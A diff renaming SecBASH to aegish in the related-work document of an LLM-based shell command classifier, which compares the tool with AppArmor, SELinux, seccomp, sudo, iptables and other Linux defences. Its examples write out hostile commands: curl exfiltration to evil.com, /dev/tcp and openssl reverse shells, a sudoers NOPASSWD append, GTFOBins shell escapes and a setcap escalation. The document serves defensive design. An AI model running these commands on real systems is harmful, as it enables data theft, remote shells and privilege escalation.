@@ -1,8 +1,8 @@
 # Related Work: Linux Security Mechanisms
 
-This document analyzes standard Linux security tools and mechanisms that are relevant to SecBASH, explaining why SecBASH complements (not replaces) each one.
+This document analyzes standard Linux security tools and mechanisms that are relevant to aegish, explaining why aegish complements (not replaces) each one.
 
-**Key Insight:** SecBASH operates at the semantic/intent level (understanding what a command *means*), while these tools operate at the system/kernel level (controlling what a process *can do*). SecBASH catches threats *before* execution; these tools enforce constraints *during* execution.
+**Key Insight:** aegish operates at the semantic/intent level (understanding what a command *means*), while these tools operate at the system/kernel level (controlling what a process *can do*). aegish catches threats *before* execution; these tools enforce constraints *during* execution.
 
 ---
 
@@ -25,8 +25,8 @@ AppArmor is a Linux Security Module (LSM) that confines programs to a limited se
 - **No composition awareness**: Cannot reason about piped commands (`tar czf - /etc/shadow | base64 | curl ...`).
 - **Profile maintenance burden**: Requires expert knowledge to create and maintain profiles.
 
-### Why SecBASH Complements AppArmor
-AppArmor enforces *what resources* a process can access; SecBASH evaluates *what the user intends to do*. A shell confined by AppArmor still allows many dangerous operations within its permitted resource set. For example, if `bash` is permitted to run `curl` and read `/etc/passwd` (both common requirements), AppArmor cannot prevent `curl -d @/etc/passwd http://evil.com`. SecBASH recognizes this as data exfiltration by understanding the command's semantic intent. Conversely, if a novel technique bypasses SecBASH's classification, AppArmor provides a hard kernel-level backstop. Both layers together create defense-in-depth.
+### Why aegish Complements AppArmor
+AppArmor enforces *what resources* a process can access; aegish evaluates *what the user intends to do*. A shell confined by AppArmor still allows many dangerous operations within its permitted resource set. For example, if `bash` is permitted to run `curl` and read `/etc/passwd` (both common requirements), AppArmor cannot prevent `curl -d @/etc/passwd http://evil.com`. aegish recognizes this as data exfiltration by understanding the command's semantic intent. Conversely, if a novel technique bypasses aegish's classification, AppArmor provides a hard kernel-level backstop. Both layers together create defense-in-depth.
 
 ---
 
@@ -48,8 +48,8 @@ SELinux is a mandatory access control system developed by the NSA that uses secu
 - **Often disabled**: Complexity leads many administrators to set `SELINUX=permissive` or `disabled`, eliminating protection entirely.
 - **No command-level reasoning**: Operates on system calls and labels, not on command strings or shell semantics.
 
-### Why SecBASH Complements SELinux
-SELinux provides the strongest kernel-level access control available on Linux, but its policies are structural, not semantic. `echo 'user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers` is a `write()` system call that SELinux only blocks if the process's type lacks write access to the `etc_t` type. If the process has such access (common for admin shells), SELinux permits it. SecBASH recognizes this as privilege escalation regardless of the process's SELinux type. SecBASH catches intent; SELinux enforces access -- complementary concerns at different abstraction levels.
+### Why aegish Complements SELinux
+SELinux provides the strongest kernel-level access control available on Linux, but its policies are structural, not semantic. `echo 'user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers` is a `write()` system call that SELinux only blocks if the process's type lacks write access to the `etc_t` type. If the process has such access (common for admin shells), SELinux permits it. aegish recognizes this as privilege escalation regardless of the process's SELinux type. aegish catches intent; SELinux enforces access -- complementary concerns at different abstraction levels.
 
 ---
 
@@ -70,8 +70,8 @@ seccomp (secure computing mode) restricts the system calls a process can make. s
 - **Static policy**: Filters are set at process creation and cannot adapt to context.
 - **No command composition**: Cannot reason about pipelines or shell constructs.
 
-### Why SecBASH Complements seccomp
-seccomp operates at the lowest level -- individual system calls. It is excellent at removing kernel attack surface (blocking `ptrace`, `mount`, `kexec_load`) but cannot reason about the semantics of permitted system calls. Blocking `execve` prevents all command execution; allowing it permits all commands equally. SecBASH fills this gap by evaluating the semantic content of what will be executed before it becomes a system call. Together: SecBASH blocks dangerous commands; seccomp limits what escapes SecBASH to a restricted syscall set.
+### Why aegish Complements seccomp
+seccomp operates at the lowest level -- individual system calls. It is excellent at removing kernel attack surface (blocking `ptrace`, `mount`, `kexec_load`) but cannot reason about the semantics of permitted system calls. Blocking `execve` prevents all command execution; allowing it permits all commands equally. aegish fills this gap by evaluating the semantic content of what will be executed before it becomes a system call. Together: aegish blocks dangerous commands; seccomp limits what escapes aegish to a restricted syscall set.
 
 ---
 
@@ -92,8 +92,8 @@ Linux namespaces provide isolation of system resources: PID (process IDs), NET (
 - **Escape vulnerabilities**: Container escapes (CVE-2019-5736, CVE-2024-21626) allow processes to break out of namespace boundaries.
 - **Kernel attack surface**: Namespaces add kernel complexity, creating potential vulnerability classes.
 
-### Why SecBASH Complements Namespaces/Containers
-Within a container, users still execute shell commands. A container with network access still permits `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`. A container with mounted data volumes still permits `cat /app/secrets.yml | base64 | curl -d @- http://evil.com`. SecBASH evaluates every command within the container, catching malicious intent regardless of the isolation boundaries. Conversely, namespaces contain the blast radius if SecBASH's classifier is bypassed.
+### Why aegish Complements Namespaces/Containers
+Within a container, users still execute shell commands. A container with network access still permits `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`. A container with mounted data volumes still permits `cat /app/secrets.yml | base64 | curl -d @- http://evil.com`. aegish evaluates every command within the container, catching malicious intent regardless of the isolation boundaries. Conversely, namespaces contain the blast radius if aegish's classifier is bypassed.
 
 ---
 
@@ -113,8 +113,8 @@ Within a container, users still execute shell commands. A container with network
 - **No semantic analysis**: Within the chroot, any command is permitted.
 - **Requires root to set up**: The `chroot()` system call requires `CAP_SYS_CHROOT`.
 
-### Why SecBASH Complements chroot
-chroot provides minimal filesystem isolation. SecBASH evaluates commands within any environment, including chroot jails. Commands like `mknod /dev/sda b 8 0` (creating a block device to access the host disk) are chroot escape techniques that SecBASH can recognize and block semantically, while chroot itself has no mechanism to prevent them if the process has sufficient privileges.
+### Why aegish Complements chroot
+chroot provides minimal filesystem isolation. aegish evaluates commands within any environment, including chroot jails. Commands like `mknod /dev/sda b 8 0` (creating a block device to access the host disk) are chroot escape techniques that aegish can recognize and block semantically, while chroot itself has no mechanism to prevent them if the process has sufficient privileges.
 
 ---
 
@@ -134,8 +134,8 @@ rbash disables certain bash features: changing directories with `cd`, modifying 
 - **No intent understanding**: Blocks syntax patterns, not semantic intent.
 - **Startup file window**: `.bashrc` and `.bash_profile` are processed before restrictions take effect.
 
-### Why SecBASH Complements rbash
-rbash blocks structural patterns (no `cd`, no `/` in commands); SecBASH understands semantic intent. Every GTFOBins shell escape bypasses rbash but is caught by SecBASH. `vim -c ':!bash'` is syntactically a `vim` invocation (permitted by rbash) but semantically a shell escape (blocked by SecBASH). Together: rbash provides a deterministic baseline; SecBASH catches the semantic escapes that rbash's simplistic rules cannot.
+### Why aegish Complements rbash
+rbash blocks structural patterns (no `cd`, no `/` in commands); aegish understands semantic intent. Every GTFOBins shell escape bypasses rbash but is caught by aegish. `vim -c ':!bash'` is syntactically a `vim` invocation (permitted by rbash) but semantically a shell escape (blocked by aegish). Together: rbash provides a deterministic baseline; aegish catches the semantic escapes that rbash's simplistic rules cannot.
 
 ---
 
@@ -156,8 +156,8 @@ rbash blocks structural patterns (no `cd`, no `/` in commands); SecBASH understa
 - **GTFOBins exploitation**: Hundreds of commonly sudoed commands can be exploited for privilege escalation. `sudo vi` allows `:!/bin/bash`.
 - **Complex configuration pitfalls**: `sudo /usr/bin/less /var/log/*` allows `sudo /usr/bin/less /var/log/../../etc/shadow`.
 
-### Why SecBASH Complements sudo
-sudo asks "Is this user permitted?" SecBASH asks "Is this command's intent safe?" The complement is clearest for GTFOBins attacks. `sudo vi -c ':!/bin/bash'` seems like running an allowed editor; SecBASH recognizes the `-c ':!/bin/bash'` as a shell escape. `sudo find / -exec /bin/bash \;` is a classic escalation -- sudo checks that `find` is permitted; SecBASH understands that `find -exec /bin/bash` executes a shell. Both are necessary.
+### Why aegish Complements sudo
+sudo asks "Is this user permitted?" aegish asks "Is this command's intent safe?" The complement is clearest for GTFOBins attacks. `sudo vi -c ':!/bin/bash'` seems like running an allowed editor; aegish recognizes the `-c ':!/bin/bash'` as a shell escape. `sudo find / -exec /bin/bash \;` is a classic escalation -- sudo checks that `find` is permitted; aegish understands that `find -exec /bin/bash` executes a shell. Both are necessary.
 
 ---
 
@@ -178,8 +178,8 @@ sudo asks "Is this user permitted?" SecBASH asks "Is this command's intent safe?
 - **Volume and noise**: Audit logs on busy systems are enormous; filtering is challenging.
 - **Post-compromise limitation**: Root attacker can disable auditd or clear logs.
 
-### Why SecBASH Complements auditd
-SecBASH is **preventive**; auditd is **detective**. SecBASH reduces noise by blocking recognized threats before they generate events. auditd provides visibility into what happens after SecBASH permits a command. If SecBASH misclassifies, auditd's logs provide the forensic trail. auditd also detects threats bypassing SecBASH entirely (background processes, cron jobs). Together: prevent-detect-respond pipeline.
+### Why aegish Complements auditd
+aegish is **preventive**; auditd is **detective**. aegish reduces noise by blocking recognized threats before they generate events. auditd provides visibility into what happens after aegish permits a command. If aegish misclassifies, auditd's logs provide the forensic trail. auditd also detects threats bypassing aegish entirely (background processes, cron jobs). Together: prevent-detect-respond pipeline.
 
 ---
 
@@ -202,8 +202,8 @@ SecBASH is **preventive**; auditd is **detective**. SecBASH reduces noise by blo
 - **Not designed for shell sessions**: Designed for individual applications, not arbitrary command evaluation.
 - **Bypass through allowed capabilities**: Permitted operations can be exploited regardless of intent.
 
-### Why SecBASH Complements Firejail/bwrap
-`firejail --net=none bash` prevents network-based reverse shells but not `rm -rf /`, `cat /etc/shadow`, or fork bombs within the sandbox. SecBASH recognizes and blocks all of these by semantic intent. Conversely, if a novel technique passes SecBASH, Firejail's network namespace still blocks outgoing connections. The combination provides both intent-level and resource-level protection.
+### Why aegish Complements Firejail/bwrap
+`firejail --net=none bash` prevents network-based reverse shells but not `rm -rf /`, `cat /etc/shadow`, or fork bombs within the sandbox. aegish recognizes and blocks all of these by semantic intent. Conversely, if a novel technique passes aegish, Firejail's network namespace still blocks outgoing connections. The combination provides both intent-level and resource-level protection.
 
 ---
 
@@ -224,8 +224,8 @@ Linux kernel packet filtering framework. Inspects network packets and applies ru
 - **Egress filtering rarely deployed**: Most systems allow unrestricted outbound connections. Ports 80/443 are typically permitted.
 - **DNS tunneling bypass**: Data exfiltration through DNS queries is almost always permitted.
 
-### Why SecBASH Complements iptables/nftables
-This is one of the most important complementary relationships. `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1` on a blocked port fails due to iptables. But `openssl s_client -quiet -connect 10.0.0.1:443 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8443` uses port 443 -- almost always permitted. iptables cannot distinguish this from legitimate HTTPS. SecBASH recognizes piping shell I/O through encrypted connections as a reverse shell regardless of port. Conversely, iptables provides network-level enforcement if SecBASH misses a novel technique. Two independent barriers.
+### Why aegish Complements iptables/nftables
+This is one of the most important complementary relationships. `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1` on a blocked port fails due to iptables. But `openssl s_client -quiet -connect 10.0.0.1:443 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8443` uses port 443 -- almost always permitted. iptables cannot distinguish this from legitimate HTTPS. aegish recognizes piping shell I/O through encrypted connections as a reverse shell regardless of port. Conversely, iptables provides network-level enforcement if aegish misses a novel technique. Two independent barriers.
 
 ---
 
@@ -244,8 +244,8 @@ Decomposes root privilege into ~40 distinct capabilities (e.g., `CAP_NET_BIND_SE
 - **CAP_SYS_ADMIN is too broad**: Effectively near-root.
 - **Capability abuse**: `setcap cap_setuid+ep /usr/bin/python3` grants Python UID-changing ability -- a classic escalation.
 
-### Why SecBASH Complements Linux Capabilities
-`setcap cap_setuid+ep /usr/bin/python3` grants Python the ability to become root. The kernel sees a legitimate `setxattr()` by a process with `CAP_SETFCAP` and permits it. SecBASH recognizes granting `cap_setuid` to an interpreter as an escalation technique and blocks it. SecBASH prevents intentional misuse of capabilities; capabilities prevent unintended exercise of privilege.
+### Why aegish Complements Linux Capabilities
+`setcap cap_setuid+ep /usr/bin/python3` grants Python the ability to become root. The kernel sees a legitimate `setxattr()` by a process with `CAP_SETFCAP` and permits it. aegish recognizes granting `cap_setuid` to an interpreter as an escalation technique and blocks it. aegish prevents intentional misuse of capabilities; capabilities prevent unintended exercise of privilege.
 
 ---
 
@@ -264,8 +264,8 @@ grsecurity patches the Linux kernel for hardening: enhanced ASLR, W^X enforcemen
 - **No semantic analysis**: Operates entirely at the kernel level.
 - **Compatibility issues**: Strict PaX MPROTECT can break JIT-dependent applications.
 
-### Why SecBASH Complements grsecurity/PaX
-grsecurity operates at the lowest level -- kernel memory layout, control flow integrity, hardware-level exploit mitigation. SecBASH operates at the highest level -- understanding human-readable command strings. grsecurity cannot prevent `echo 'user ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers` because this is a perfectly normal `write()` system call. SecBASH recognizes it as privilege escalation. Conversely, if a sophisticated attacker bypasses SecBASH and attempts a memory corruption exploit, grsecurity makes exploitation unreliable.
+### Why aegish Complements grsecurity/PaX
+grsecurity operates at the lowest level -- kernel memory layout, control flow integrity, hardware-level exploit mitigation. aegish operates at the highest level -- understanding human-readable command strings. grsecurity cannot prevent `echo 'user ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers` because this is a perfectly normal `write()` system call. aegish recognizes it as privilege escalation. Conversely, if a sophisticated attacker bypasses aegish and attempts a memory corruption exploit, grsecurity makes exploitation unreliable.
 
 ---
 
@@ -273,7 +273,7 @@ grsecurity operates at the lowest level -- kernel memory layout, control flow in
 
 ```
 +----------------------------------------------------------+
-|  Layer 6: SEMANTIC / INTENT (SecBASH)                     |
+|  Layer 6: SEMANTIC / INTENT (aegish)                     |
 |  "What does this command MEAN? Is the intent malicious?"  |
 |  Pre-execution, LLM-based classification                  |
 +----------------------------------------------------------+
@@ -310,8 +310,8 @@ Every existing Linux security mechanism operates on **mechanisms** (system calls
 
 3. **Obfuscation defeats pattern matching**: Reverse shells can be built in dozens of languages using standard libraries. LLM-based semantic analysis recognizes the underlying intent.
 
-**Without SecBASH**: An attacker whose command passes syntactic, authentication, path, label, and syscall checks can still execute semantically malicious commands using only permitted operations.
+**Without aegish**: An attacker whose command passes syntactic, authentication, path, label, and syscall checks can still execute semantically malicious commands using only permitted operations.
 
-**Without kernel mechanisms**: SecBASH's classifier might be bypassed by sufficiently obfuscated commands. Without kernel enforcement, a missed classification results in unrestricted execution.
+**Without kernel mechanisms**: aegish's classifier might be bypassed by sufficiently obfuscated commands. Without kernel enforcement, a missed classification results in unrestricted execution.
 
 **With both**: Threats must bypass both semantic analysis AND runtime enforcement -- fundamentally different analysis approaches making simultaneous bypass extremely difficult.
